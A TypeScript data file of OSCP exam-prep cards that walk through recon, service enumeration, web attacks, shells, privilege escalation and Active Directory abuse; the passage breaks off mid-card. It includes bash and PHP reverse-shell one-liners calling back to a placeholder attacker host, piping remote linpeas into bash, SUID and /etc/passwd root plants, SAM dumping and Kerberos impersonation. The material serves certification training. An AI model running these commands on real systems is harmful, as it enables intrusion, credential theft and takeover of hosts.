import type { Technique } from "./methodology";

export const MORE_TECHNIQUES: Technique[] = [
  {
    id: "exam-points",
    section: "Exam",
    title: "Points and the clock",
    look: "One AD set and three standalones. A full standalone is local.txt plus proof.txt. AD is the large block. Chase 70 raw points until OffSec tells you otherwise. From 1 December 2026 they scale that raw total. The scaled number is their formula, not a second target you invent. Confirm the live page on the day.",
    cmd: `# while scans run, write this on paper
# AD: client local, client local, DC  — the big block
# standalone: local.txt = half, proof.txt = half
# pass path that does not need every box:
# full AD + three local flags
# or full AD + one full standalone + one more local`,
    alive: "You can name which 70-point combination you are chasing before hour two.",
    dead: "You are two hours into one standalone kernel compile and the AD creds are still unused.",
    next: "Use the given AD user first. Standalones fill the rest. Do not save AD for the last three hours.",
  },
  {
    id: "exam-breach",
    section: "Exam",
    title: "AD is an assumed breach",
    look: "The exam hands you a domain username and password. That is the start of the AD set, not a hint to ignore. Standalones do not get that gift.",
    cmd: `# put the given creds in the notes before the first spray
# then, from Kali
nxc smb <dc> -u <user> -p '<pass>'
nxc smb <cidr> -u <user> -p '<pass>'`,
    alive: "[+] domain\\user:password on the DC. You are in the domain. Enumerate, do not celebrate.",
    dead: "STATUS_LOGON_FAILURE on the creds from the exam panel. You typed them wrong. Check the VPN email again before you spray anything else.",
    next: "BloodHound and the roast cards. Also full-port scan every host. Domain creds do not replace nmap.",
  },
  {
    id: "exam-hole",
    section: "Exam",
    title: "The 45-minute hole",
    look: "A lead is alive only if the last action produced a new fact: a file, a cred, a version, a writable path. 'Still compiling' is not a fact.",
    cmd: `# when the timer in your head hits 45 minutes on one idea, write:
# what I proved:
# what is still a guess:
# next card if this dies:`,
    alive: "You can point at a new credential, a new host, or a confirmed misconfig.",
    dead: "Same error as 40 minutes ago. GLIBC, 'password incorrect', or an exploit that will not compile.",
    next: "Mark the card dead, go to the next card in that section, and leave a one-line note so you do not restart it at 3am.",
  },
  {
    id: "exam-not",
    section: "Exam",
    title: "Not this exam",
    look: "Your notes also cover Wi-Fi, ARP poison, Responder, SMB relay, AV bypass, Shellter, and thread injection. OffSec does not allow poisoning or spoofing on the exam. Wi-Fi is not an exam target.",
    cmd: `# do not start
# responder
# bettercap / arpspoof
# ntlmrelayx
# aircrack / wifiphisher
# shellter, thread injection, a custom keylogger`,
    alive: "You closed that tab and went back to nmap, web, or the domain user you were given.",
    dead: "A rogue AP or a relay 'because the notes have a page on it'. That page is for other work. It will not score this exam.",
    next: "If SMB signing is off, note it and skip relay. Find a share, a roast, or a local misconfig instead.",
  },
  {
    id: "exam-msf",
    section: "Exam",
    title: "Metasploit is not the method",
    look: "Confirm the current exam guide before you sit. The working method is manual: Penelope, impacket, nxc, a single targeted payload. Do not build a box around msfconsole.",
    cmd: `# listener
penelope -O -p 443
# payload only when you already know it will execute
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell.exe`,
    alive: "You needed one payload format and you left msfconsole closed.",
    dead: "You are searching exploit modules because searchsploit was empty. The version was not vulnerable. A module will not invent a bug.",
    next: "Back to the service card. If you truly use a module, do it on one host and write down that you did.",
  },
  {
    id: "recon-udp",
    section: "Recon",
    title: "UDP that matters",
    look: "SNMP, TFTP, NTP, IKE, and sometimes DNS only exist on UDP. Run top 20 on every host after the TCP passes. A reply is worth one service card. A full UDP scan of 65535 is how you lose the morning.",
    cmd: `sudo nmap -Pn -sU --top-ports 20 -T4 -oA scans/udp <ip>
# 161 often says open|filtered. That still deserves one community-string check.
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <ip>`,
    alive: "161 replies to public, or 69 accepts a get. NTP by itself, or a closed 53, is not a shell.",
    dead: "open|filtered on everything and onesixtyone is silent. UDP is done. Do not escalate to all 65535 ports.",
    next: "If nmap only says open|filtered, run Cisco's UDP protocol scanner on the Recon page. A named reply there is a service. Silence is the same dead end. SNMP still gets one community-string check when 161 is the interesting line.",
  },
  {
    id: "recon-hosts",
    section: "Recon",
    title: "Names and /etc/hosts",
    look: "A website that only answers by hostname, or a DC that wants the domain name. The IP loads a default page and you think the app is empty.",
    cmd: `# from certificates, nmap, smb, or a redirect
echo '<ip>  app.local dc.domain.local domain.local' | sudo tee -a /etc/hosts
curl -sI http://app.local
curl -skI https://dc.domain.local`,
    alive: "The vhost returns a real title and the IP returned IIS/Apache default.",
    dead: "Same default page on the name and the IP. Host header was not the issue.",
    next: "Gobuster/ferox against the name, not only the IP.",
  },
  {
    id: "recon-folder",
    section: "Recon",
    title: "One folder per host",
    look: "Exam panic is lost scans. Before the first packet, make the tree. Drop every nmap file in it.",
    cmd: `mkdir -p exam/{10.10.10.11,10.10.10.12,10.10.10.13,ad}/{nmap,loot,shells}
# in each host folder, a notes.txt with:
# users:
# creds:
# dead ends:`,
    alive: "You can open one file and see users, passwords, and what you already marked dead.",
    dead: "Commands live in the terminal scrollback only. You will rescan at 2am.",
    next: "Tick the card in this desk when you have actually run it, not when you meant to.",
  },
  {
    id: "svc-telnet",
    section: "Services",
    title: "Telnet",
    look: "Port 23. A banner and a login. Creds you already have, or a menu that is already a shell. Do not hydra it.",
    cmd: `telnet <ip>
# or
nc <ip> 23`,
    alive: "A login that accepts a password from a file you downloaded, or a root shell with no password.",
    dead: "Login incorrect and you have no candidates. Close it.",
    next: "Same password on SSH and the web app.",
  },
  {
    id: "svc-mail",
    section: "Services",
    title: "POP3 and IMAP",
    look: "110 and 995 are POP. 143 and 993 are IMAP. First a banner. Then one mailbox whose password you already have. You are reading mail for a password or a hostname, not attacking the protocol.",
    cmd: `# FIRST
nc -nv <ip> 110
# TALK, POP. Typed at the mail prompt.
# USER <name>
# PASS <password from elsewhere>
# LIST
# RETR 1
# QUIT
# 995 is TLS
openssl s_client -quiet -connect <ip>:995
# IMAP
nc -nv <ip> 143
# a1 LOGIN <user> <pass>
# a2 LIST "" "*"
# a3 SELECT INBOX
# a4 FETCH 1 BODY[]
# USE IT
# a password, a hostname, or a ticket in the body. Add every address in the headers to the user list.`,
    alive: "A message with a password, a hostname, or a ticket.",
    dead: "Auth failed, or the inbox is a test message with no secret. Do not brute POP.",
    next: "Add every name in the headers to your user list.",
  },
  {
    id: "svc-tftp",
    section: "Services",
    title: "TFTP",
    look: "UDP 69. No login. The first check is the enum script, because you need a filename. A config or a boot script is the win. You upload only when you already know the device runs that exact name.",
    cmd: `# FIRST
sudo nmap -Pn -sU -p 69 --script tftp-enum <ip>
# TALK
atftp --get -r <file> -l loot/<file> <ip>
tftp <ip>
# get <file>
# put <file>   only if that name is executed
# USE IT
# a community string, a password, or a script you can read
# a successful put that nothing executes is not a shell. Confirm the far side.`,
    alive: "A file lands and it contains a community string, a password, or a script.",
    dead: "Transfer timed out and the enum script lists nothing. Stop guessing filenames.",
    next: "Read the file. Do not upload a shell unless you already know the device executes it.",
  },
  {
    id: "svc-redis",
    section: "Services",
    title: "Redis",
    look: "6379 without a password. INFO tells you. CONFIG only matters if the course path (cron or authorized_keys) is actually writable from Redis.",
    cmd: `redis-cli -h <ip> INFO server
redis-cli -h <ip> CONFIG GET dir
redis-cli -h <ip> CONFIG GET dbfilename`,
    alive: "NOAUTH is absent, you get a redis_version, and dir is a path you can abuse (for example /var/lib/redis or a web root).",
    dead: "NOAUTH Authentication required, or AUTH with your known passwords fails. Redis is closed.",
    next: "If you go for keys or a cron file, confirm on the far side that the file changed. A write that never lands is dead.",
  },
  {
    id: "svc-rsync",
    section: "Services",
    title: "rsync",
    look: "873. Anonymous modules. Same idea as a share: list, pull, read.",
    cmd: `rsync rsync://<ip>/
rsync -av rsync://<ip>/<module> ./loot/`,
    alive: "A module name and files you can read. Sometimes you can write.",
    dead: "@ERROR: auth failed and you have no secret. Skip.",
    next: "Grep the copies for passwords. If the module is writable, see if a cron or a web root consumes it.",
  },
  {
    id: "svc-vnc",
    section: "Services",
    title: "VNC",
    look: "5900 or 5901. First, does it demand a password. No auth, or a password you already stole from a file. The win is the logged-on desktop. This is not VPN. 1194 is not this card.",
    cmd: `# FIRST
nmap -Pn -p 5900,5901 --script vnc-info,vnc-title <ip>
# TALK
vncviewer <ip>:5900
# a password sitting in cleartext in a config you already stole
# an 8-byte .vnc/passwd is the fixed-key DES blob. Use the one script you practised. Do not hydra.
# an open document, a password manager, a shell on the desktop
# then SSH or RDP with that password if the GUI is slow
# do not hydra VNC`,
    alive: "The screen opens and a user is logged on, or a password file is visible.",
    dead: "Authentication failed. Do not throw rockyou at VNC in the first hour.",
    next: "Take the password or the open document. Then use SSH or RDP if it is cleaner.",
  },
  {
    id: "svc-postgres",
    section: "Services",
    title: "Postgres",
    look: "5432 from Kali. psql is the client. postgres with password postgres, an empty password, or the one from a config. usesuper has to be true before COPY TO PROGRAM. A normal login is rows, not root.",
    cmd: `# FIRST
nc -nv <ip> 5432
psql -h <ip> -p 5432 -U postgres -d postgres
# password: empty, then postgres, then the config password. Nothing else.
# INSIDE. Backslash commands have no semicolon.
\\conninfo
\\l
\\c <db>
\\dt
SELECT current_user, usesuper FROM pg_user;
SELECT usename FROM pg_user;
# USE IT. Only when usesuper is t.
COPY (SELECT '') TO PROGRAM 'id';
# a password column is the identify builder`,
    alive: "You get a prompt and a table of users, or a password column.",
    dead: "password authentication failed. Try only passwords you already hold.",
    next: "Read the data. COPY ... PROGRAM is a lead only if your user is a superuser. Check `SELECT current_user, usesuper FROM pg_user`.",
  },
  {
    id: "svc-rpc",
    section: "Services",
    title: "RPC and null SMB",
    look: "135 plus 139/445. Anonymous RPC still leaks users on some lab hosts. Users become the spray list later, not a wordlist to brute now.",
    cmd: `rpcclient -U "" -N <ip>
# enumdomusers
nxc smb <ip> -u '' -p '' --users
enum4linux-ng -A <ip>`,
    alive: "A list of real usernames, or a share you did not see in smbclient.",
    dead: "NT_STATUS_ACCESS_DENIED and enumdomusers fails. Null session is closed. Use creds you find elsewhere.",
    next: "Save the names. Do not spray yet.",
  },
  {
    id: "svc-krb",
    section: "Services",
    title: "Port 88 means AD",
    look: "Kerberos open. This host is part of a domain. Do not searchsploit 'kerberos' and do not treat it as a standalone CVE.",
    cmd: `nmap -p 88,389,445,3389,5985 <ip>
# after you have the exam user
nxc smb <ip> -u <user> -p '<pass>'`,
    alive: "88/tcp open and nxc accepts the domain user.",
    dead: "88 filtered and the machine is WORKGROUP. Not a domain controller.",
    next: "Switch to the Active Directory section. Keep enumerating HTTP and SMB on the same host.",
  },
  {
    id: "web-finger",
    section: "Web",
    title: "Fingerprint before brute force",
    look: "Server header, title, cookies, robots, a comment in the HTML. The directory list is useless if you never learned the product.",
    cmd: `whatweb -a 3 http://<ip>
curl -sI http://<ip>
curl -s http://<ip>/robots.txt
curl -s http://<ip>/ | head -c 2000`,
    alive: "A product name and version, or a robots path that is not linked from the homepage.",
    dead: "Server: Apache and an empty body. Then you brute directories. You do not run nikto and wait.",
    next: "searchsploit the product. Start ferox in the background and read the homepage properly while it runs.",
  },
  {
    id: "web-dirs",
    section: "Web",
    title: "Directories and extensions",
    look: "Hidden paths and backup files. Extensions are the difference between a 404 and a source leak: php, txt, bak, old, zip, config.",
    cmd: `feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,old -t 50 -o ferox.txt
# IIS
feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x asp,aspx,txt,config -t 50`,
    alive: "200 or 301 on /backup, /admin, /.git, or a .bak of a page you already saw.",
    dead: "Only / and /index and a pile of 404s. Do not start the big wordlist 'just in case' until the rest of the port is dead.",
    next: "Download every 200 that is not an image. Read it. A parameter, a POST body, a cookie, or a Host header is the wfuzz builder on this page, not a bigger directory list.",
  },
  {
    id: "web-git",
    section: "Web",
    title: "Exposed git",
    look: "/.git/HEAD returns refs/heads/main. The site is the repo. Source and old passwords live in history.",
    cmd: `curl -s http://<ip>/.git/HEAD
# if that prints a ref
git-dumper http://<ip>/.git ./repo
cd repo && git log -p | head`,
    alive: "ref: refs/heads/master and git-dumper writes objects.",
    dead: "404 or a 403 HTML page. There is no repo.",
    next: "Search the dump for password, key, and TODO. A leaked DB password is the next login.",
  },
  {
    id: "web-wrap",
    section: "Web",
    title: "PHP wrappers",
    look: "An LFI that is include() and not a raw file read. Wrappers turn the filter into source code, which is where the password sits.",
    cmd: `curl -s 'http://<ip>/page.php?file=php://filter/convert.base64-encode/resource=index.php' | base64 -d
# also try
# ....//....//....//etc/passwd
# /var/log/apache2/access.log   after you poison the User-Agent`,
    alive: "Base64 decodes to <?php and a password or an include of a config file.",
    dead: "The parameter only reflects a string, or php:// is stripped. It is not LFI.",
    next: "The config password logs you into the app or the database. Log poison only if you already confirmed the log path is included.",
  },
  {
    id: "web-sqlmap",
    section: "Web",
    title: "sqlmap is not the exam",
    look: "The current OSCP+ guide lists sqlmap with the automatic exploitation tools. Do not run it on the exam or while writing the exam report. The SQLi 1 to 6 cards are the method. This card exists so you do not follow the old note.",
    cmd: `# exam: do not run
# sqlmap -u 'http://<ip>/item.php?id=1' --batch --dbs
# a lab you are allowed to automate, and only after SQLi 1 already proved the parameter:
# sqlmap -u 'http://<ip>/item.php?id=1' --batch --technique=U --dbs`,
    alive: "You closed it and finished SQLi 2, 3, or 4 by hand.",
    dead: "You are watching sqlmap because the manual page did not change. If SQLi 1 was identical and not slow, the parameter is dead. sqlmap will not invent the bug.",
    next: "Check the exam guide the week you sit, in case the wording moves. Until it allows sqlmap, the manual cards stay the path.",
  },
  {
    id: "web-idor",
    section: "Web",
    title: "IDOR",
    look: "An id, uid, file, or account number in the query or the JSON. Change it by one. This is also the API BOLA check. You want another user's object, not a new bug class.",
    cmd: `# you are user id 15
curl -s http://<ip>/api/users/15 -H 'Cookie: session=...'
curl -s http://<ip>/api/users/14 -H 'Cookie: session=...'
curl -s http://<ip>/download?file=15.txt
curl -s http://<ip>/download?file=1.txt`,
    alive: "User 14's email, a file you do not own, or an admin-only field.",
    dead: "401 or your own object again. Authorisation is checked. Skip.",
    next: "The other object's secret is a password or a path to an admin function.",
  },
  {
    id: "web-wp",
    section: "Web",
    title: "WordPress",
    look: "/wp-login.php or a generator meta tag. Users, plugins, and a weak admin password. Do not pentest WordPress core for sport.",
    cmd: `wpscan --url http://<ip> --enumerate u,vp --plugins-detection mixed
# only if you have a small password list from the box
wpscan --url http://<ip> -U admin -P passwords.txt`,
    alive: "A username plus an outdated plugin that searchsploit actually has a matching unauth bug for, or a login that works.",
    dead: "wpscan finishes and every plugin is current. No rockyou against xmlrpc.",
    next: "Exploit the one plugin, or use the login and look for a theme editor / file manager.",
  },
  {
    id: "web-tomcat",
    section: "Web",
    title: "Tomcat manager",
    look: "8080 and a /manager/html 401. A handful of default pairs, then creds you found. A WAR upload is the shell.",
    cmd: `curl -sI http://<ip>:8080/manager/html
curl -sI http://<ip>:8080/host-manager/html
# try, one at a time, from notes you already have:
# tomcat:s3cret   tomcat:tomcat   admin:admin
curl -u 'tomcat:s3cret' http://<ip>:8080/manager/html | head`,
    alive: "200 and the HTML lists Applications and a deploy form.",
    dead: "401 on every pair you actually possess. Do not start hydra on manager.",
    next: "Upload a small WAR that calls back to Penelope. If the manager is HTML-only, use the text interface the page documents.",
  },
  {
    id: "web-jenkins",
    section: "Web",
    title: "Jenkins",
    look: "8080 or 8443, a Jenkins title, or X-Jenkins header. Script console or a build that runs your command. Anonymous read is not always anonymous execute.",
    cmd: `curl -sI http://<ip>:8080 | head
curl -s http://<ip>:8080/script | head
# with creds
curl -u 'user:pass' http://<ip>:8080/script`,
    alive: "The script console form loads. A Groovy reverse shell is the next step you already practised.",
    dead: "Login wall and you have no password. Directory brute will not invent the console.",
    next: "One command to prove id, then a shell. Do not paste five payloads.",
  },
  {
    id: "web-csrf",
    section: "Web",
    title: "CSRF is usually dead here",
    look: "A state-changing request with no token. On OSCP this almost never gets the first shell. It matters only if you already have a way to make a logged-in admin submit it.",
    cmd: `# compare a change-password or add-user request
# with and without the csrf parameter`,
    alive: "The action succeeds with the token removed, AND an admin will hit your page.",
    dead: "No second user exists. CSRF cannot escalate you. Skip.",
    next: "Go back to LFI, SQLi, upload, and creds.",
  },
  {
    id: "web-nikto",
    section: "Web",
    title: "Nikto in the background",
    look: "A noisy checklist. Start it, do not watch it. You already know the interesting headers from curl.",
    cmd: `nikto -h http://<ip> -o nikto.txt &`,
    alive: "It later names a path or a method you had not seen, and you confirm it by hand.",
    dead: "A list of missing X-Frame-Options. That does not get a shell. Do not read it line by line during the exam.",
    next: "Confirm one finding. Close the rest.",
  },
  {
    id: "sh-which",
    section: "Shells",
    title: "Match the shell to the box",
    look: "What actually exists. A bash payload on a Windows host is dead. A PowerShell payload on a tiny Linux box is dead.",
    cmd: `# Linux
which bash python3 python php nc curl wget 2>/dev/null
# Windows
where powershell
where certutil`,
    alive: "bash and /dev/tcp, or python3, or powershell. You pick the first one that exists.",
    dead: "which prints nothing useful and you keep pasting bash into cmd.exe.",
    next: "Penelope is listening before you fire the payload. One payload.",
  },
  {
    id: "sh-bash",
    section: "Shells",
    title: "Bash callback",
    look: "bash is installed and the host can reach your VPN IP. This is the default Linux callback.",
    cmd: `bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'`,
    alive: "Penelope shows a session and id prints the web or service user, not root.",
    dead: "No connection. Test reachability with curl http://<KALI>/ from the host. Wrong LHOST is the usual cause.",
    next: "TTY card if Penelope did not already upgrade it. Then Linux order.",
  },
  {
    id: "sh-php",
    section: "Shells",
    title: "PHP callback",
    look: "You can run PHP: an upload, a page, or php -r. Use it when bash is missing.",
    cmd: `php -r '$sock=fsockopen("<KALI>",443);proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);'`,
    alive: "Session opens as the web user (www-data, apache, nginx).",
    dead: "php is not in the path, or the host blocks outbound 443. Try the port you already saw allowed, often 80 or 53 only if you tested it.",
    next: "You are not root. Start the Linux order.",
  },
  {
    id: "sh-ps",
    section: "Shells",
    title: "PowerShell callback",
    look: "A Windows host where you can run PowerShell. Generate the encoded line. Do not write the encoder by hand in the exam.",
    cmd: `# on Kali, from your notes or revshells.com style one-liner you already saved
# listener first
penelope -O -p 443`,
    alive: "Penelope gets a session and whoami is the service account or the user, not SYSTEM.",
    dead: "Execution policy is not why a reverse shell failed. A wrong LHOST or a payload for x86 on an x64 box is why. 'cannot execute' on a 441-byte file is a bad download.",
    next: "whoami /priv immediately.",
  },
  {
    id: "lin-pkexec",
    section: "Linux",
    title: "pkexec version check",
    look: "pkexec is SUID and polkit is the old vulnerable build, and every misconfig card is dead. This is PwnKit, a polkit bug, still not 'try linux-exploit-suggester and pick one'.",
    cmd: `find / -perm -4000 -type f 2>/dev/null | grep pkexec
pkexec --version`,
    alive: "pkexec is SUID root and the version matches the public local bug you practised, on a box with nothing else alive.",
    dead: "pkexec is not SUID, or the distro is current. Skip. A standard SUID list that includes pkexec is normal. The version is the test, not the path.",
    next: "One PoC. If it fails, stop. Do not chain it into a kernel rabbit hole.",
  },
  {
    id: "lin-peas-read",
    section: "Linux",
    title: "Reading linpeas",
    look: "99% is red because the script is loud. You are confirming a short list: sudo -l, SUID outside the standard set, caps, cron, passwords, docker, interesting listeners.",
    cmd: `curl -sL http://<KALI>/linpeas.sh | bash -s -- -a 2>/dev/null | tee /tmp/peas.txt
grep -n -i -E 'NOPASSWD|SUID|cap_setuid|cron|password|docker|writable' /tmp/peas.txt | head`,
    alive: "A line you can re-run by hand and get the same fact without linpeas.",
    dead: "A wall of red kernel CVEs on a patched Ubuntu, or 'writable /usr/bin' that is actually not writable when you touch it.",
    next: "Re-run the one finding with the matching card. If you cannot confirm it, it is dead.",
  },
  {
    id: "lin-pspy",
    section: "Linux",
    title: "pspy",
    look: "A root process that does not show in the crontab you can read: wildcard tar, a backup script, a path you can hijack. Let it sit for two minutes, not twenty.",
    cmd: `./pspy64`,
    alive: `CMD: UID=0  tar czf /tmp/backup.tar * 
# in a directory you can write
# or
CMD: UID=0  /opt/scripts/run.sh`,
    dead: "Only cron.daily logs and systemd. Nothing new after two minutes. Kill it.",
    next: "If you saw a script, ls -la it. If you saw tar *, plant the checkpoint file you practised. Then wait one cycle only.",
  },
  {
    id: "lin-path",
    section: "Linux",
    title: "PATH hijack",
    look: "A root cron or a sudo NOPASSWD script that calls a command by name (cp, tar, service) and your user can write a directory that appears first in that PATH.",
    cmd: `echo $PATH
# inside the script, look for commands without a leading /
# plant
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /tmp/cp
chmod +x /tmp/cp
# only if the job's PATH starts with /tmp, or you can change the script`,
    alive: "The root job runs /tmp/cp or your planted name, and /tmp/rootbash is SUID.",
    dead: "The script uses /usr/bin/cp with a full path, and you cannot edit the script. PATH is irrelevant.",
    next: "/tmp/rootbash -p and you are root. -p keeps the privilege.",
  },
  {
    id: "lin-passwd",
    section: "Linux",
    title: "Writable passwd",
    look: "You can write /etc/passwd. Rare, obvious, and faster than a kernel bug.",
    cmd: `ls -la /etc/passwd
# if you are the owner or it is world-writable
openssl passwd -1 -salt x pass123
# append a root-equivalent line using that hash
# user:hash:0:0:root:/root:/bin/bash`,
    alive: "The new line is in the file and su - user with that password gives euid 0.",
    dead: "-rw-r--r-- root root. You cannot write it. Do not keep staring at it.",
    next: "Read proof.txt. Do not leave an extra root user as your only note. Screenshot first.",
  },
  {
    id: "lin-nfs2",
    section: "Linux",
    title: "NFS no_root_squash",
    look: "/etc/exports or showmount shows a share with no_root_squash. From Kali as root, files you create on the mount are root-owned on the server.",
    cmd: `showmount -e <ip>
cat /etc/exports
sudo mount -t nfs <ip>:/share /mnt/nfs
# on Kali, as root, if the share is no_root_squash
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash`,
    alive: "exports contains no_root_squash and the SUID bash appears on the server.",
    dead: "root_squash or all_squash. Your files are nobody. Mounting the share still lets you read it. Do that, then stop the SUID idea.",
    next: "On the server, /share/rootbash -p.",
  },
  {
    id: "lin-listen",
    section: "Linux",
    title: "Local listeners",
    look: "A service bound to 127.0.0.1 that your nmap from Kali never saw. MySQL, a debug port, a dev admin panel.",
    cmd: `ss -tlnp || netstat -tlnp`,
    alive: `127.0.0.1:3306
127.0.0.1:8080
127.0.0.1:5005`,
    dead: "Only 0.0.0.0 ports you already scanned, plus sshd.",
    next: "From this shell, curl 127.0.0.1 is enough. If the tool you need is on Kali, use the tunnel builder's victim loopback. Do not point proxychains at 127.0.0.1. That address is Kali.",
  },
  {
    id: "lin-jdebug",
    section: "Linux",
    title: "Java debug as root",
    look: "A Java process running as root and a JDWP port, often 5005, sometimes only on localhost. Confirm the user before you spend time on a debugger.",
    cmd: `ps aux | grep -i java
ss -tlnp | grep 5005`,
    alive: "root owns the JVM and 5005 is listening.",
    dead: "Java is running as the app user you already are, or there is no debug port. The process list is not a vulnerability.",
    next: "Use the JDWP approach you practised, one shot, to run id. If it is not root, you only got another shell as yourself.",
  },
  {
    id: "win-token",
    section: "Windows",
    title: "Groups are not a shell",
    look: "whoami /groups. NT AUTHORITY\\SERVICE is not SYSTEM. High Mandatory Level is not Administrators. A filtered Administrators token means you are in the group but UAC stripped it.",
    cmd: `whoami /groups
whoami /priv`,
    alive: `BUILTIN\\Administrators  Alias  Enabled
# or
Mandatory Label\\High Mandatory Level
AND
BUILTIN\\Administrators`,
    dead: `NT AUTHORITY\\SERVICE
BUILTIN\\Users
# Administrators missing entirely
# Medium Mandatory Level plus Administrators in the group but the flag says filtered`,
    next: "Enabled Administrators: you still need a privileged action, you are not already SYSTEM. Filtered token: UAC bypass only if you practised one and the OS matches. SERVICE with SeImpersonate: Potatoes, not 'I am admin'.",
  },
  {
    id: "win-backup",
    section: "Windows",
    title: "SeBackupPrivilege",
    look: "The privilege is listed and Enabled. You can read files the ACL would otherwise deny, including a copy of the SAM. Disabled in the table means you do not have it.",
    cmd: `whoami /priv | findstr /i backup
reg save hklm\sam C:\Users\Public\sam
reg save hklm\system C:\Users\Public\system
# copy both files to Kali
impacket-secretsdump -sam sam -system system LOCAL`,
    alive: "Enabled and secretsdump prints local NTLM hashes.",
    dead: "The name is absent, or it says Disabled. Do not hunt diskshadow.",
    next: "The Administrator hash is pass-the-hash, not a crack, unless you need the cleartext.",
  },
  {
    id: "win-arch",
    section: "Windows",
    title: "Architecture before tools",
    look: "systeminfo says x64-based PC. A 32-bit mimikatz on a 64-bit Server 2022 fails even when you are Administrator. The error is not 'this host has no hashes'.",
    cmd: `systeminfo | findstr /C:"System Type"
echo %PROCESSOR_ARCHITECTURE%
# on Kali, before upload
file mimikatz.exe`,
    alive: "System Type: x64-based PC and file says PE32+ (x86-64).",
    dead: "file says PE32 (80386) and the box is x64. Access denied or a useless process is expected. Get the x64 build.",
    next: "Same rule for every Potato and PrintSpoofer. Check file and dir before you debug the exploit.",
  },
  {
    id: "win-powerup",
    section: "Windows",
    title: "PowerUp, then confirm",
    look: "One pass to suggest service and unquoted issues. Every hit gets the manual card. PowerUp is not the proof.",
    cmd: `powershell -ep bypass -c ". .\\PowerUp.ps1; Invoke-AllChecks"`,
    alive: "It names one service where you can also show SERVICE_CHANGE_CONFIG or a writable unquoted directory with icacls.",
    dead: "A list of checks with no abuse function, or an abuse function that returns Access is denied when you run the manual command.",
    next: "Run the matching Windows card by hand. One service. Then stop.",
  },
  {
    id: "win-history",
    section: "Windows",
    title: "PowerShell history",
    look: "The next user's password is often sitting in the history of the user you just landed as. This is a cred find, not a privilege bug.",
    cmd: `type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
type C:\\Users\\<you>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt`,
    alive: "A net use, a runas, or a ConvertTo-SecureString line with a real password.",
    dead: "The file does not exist, or it is only cd and dir. Check Unattend and web.config next, not a second history path for an hour.",
    next: "Try that password for every local user and for the domain.",
  },
  {
    id: "ad-nocreds",
    section: "Active Directory",
    title: "Before you have creds",
    look: "Standalones, or the minute before you type the exam password. Null shares, anonymous LDAP, and a user list. No passwords yet, so no spray.",
    cmd: `nxc smb <ip> -u '' -p '' --shares
ldapsearch -x -H ldap://<ip> -s base namingContexts
lookupsid.py <domain>/<ip> -no-pass | head`,
    alive: "A readable share, a naming context, or a RID cycle that prints real users.",
    dead: "Access denied on all three. Wait until you have the exam user. Do not kerbrute a giant name list yet.",
    next: "If you got users, save them. The first password is still the one the exam gave you.",
  },
  {
    id: "ad-bh",
    section: "Active Directory",
    title: "Reading BloodHound",
    look: "Shortest path from your owned user to Domain Admins or to a computer you can admin. You are not collecting the domain to admire it.",
    cmd: `bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <dc> -c All --zip
# import once
# queries:
# shortest path to Domain Admins from owned
# shortest path to high value targets`,
    alive: "A path of one to three edges you recognise: MemberOf, GenericAll, ForceChangePassword, HasSession, CanRDP, SQLAdmin.",
    dead: "No path, and you collect a second time hoping the graph changes. It will not. Local privesc on a domain-joined host is the missing edge.",
    next: "Do the first edge only. Mark the principal owned after it works. Then re-query. Do not pre-plan six hops.",
  },
  {
    id: "ad-acl",
    section: "Active Directory",
    title: "The ACL you can actually use",
    look: "An edge on your user. GenericAll or ForceChangePassword on a user. GenericAll or AddMember on a group. GenericWrite is a shadow-credential or an SPN, not 'edit the description and stop'.",
    cmd: `# force a password you choose, only when the edge says you can
net rpc password <targetuser> 'NewPass!23' -U <domain>/<you>%'<pass>' -S <dc>
# or bloodyAD, if that is what you practised
# group
net group "<target group>" <you> /add /domain`,
    alive: "The password change sticks and nxc shows [+] for that user, or your user appears in the group.",
    dead: "Access is denied. You mis-read the edge. Go back to the graph. Do not reset a random user.",
    next: "The new user gets the enum and roast cards again. If the group was admins on one host, that host is next.",
  },
  {
    id: "ad-deleg",
    section: "Active Directory",
    title: "Delegation",
    look: "Identify: find-delegation lists a principal you already control, and a target SPN. Unconstrained on a domain controller, with no coerce, is not this path.",
    cmd: `# 1. Identify
nxc ldap <dc> -u <user> -p '<pass>' -M find-delegation
# 2. Constrained, from an account you own, to the SPN it printed
impacket-getST <domain>/<you>:'<pass>' -spn <spn> -impersonate Administrator -dc-ip <dc>
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@<target>`,
    alive: `find-delegation prints your account and a SPN
psexec opens a shell
whoami is nt authority\\system on that one host`,
    dead: "Nothing, or only domain controllers with the normal unconstrained setting you cannot abuse without coercion. Coercion and relay are not your exam plan.",
    next: "Constrained from a user you own: the getST impersonation you practised, then pass that ticket to the listed host. One target.",
  },
  {
    id: "ad-laps",
    section: "Active Directory",
    title: "LAPS",
    look: "Identify: the LAPS module prints a local Administrator password for one computer. That is admin of that host, not domain admin.",
    cmd: `# 1. Identify
nxc ldap <dc> -u <user> -p '<pass>' -M laps
# 2. Use that password on that one computer
nxc smb <computer> -u Administrator -p '<laps-pass>'
nxc winrm <computer> -u Administrator -p '<laps-pass>'
evil-winrm -i <computer> -u Administrator -p '<laps-pass>'
whoami`,
    alive: `(Pwn3d!) on that computer
whoami is administrator`,
    dead: "Module prints nothing. You cannot read LAPS. Do not keep querying every OU.",
    next: "WinRM or SMB to that one computer with the local admin. Landing checks. It may still not be domain admin.",
  },
  {
    id: "ad-gpp",
    section: "Active Directory",
    title: "GPP passwords in SYSVOL",
    look: "Identify: Groups.xml or a scheduled-task xml in SYSVOL contains cpassword. No cpassword means this path is dead.",
    cmd: `# 1. Identify
nxc smb <dc> -u <user> -p '<pass>' -M gpp_password
# 2. If the module prints the ciphertext and not the password
gpp-decrypt '<cpassword>'
# 3. One login with the clear password
nxc smb <dc> -u <user-from-xml> -p '<clear>'`,
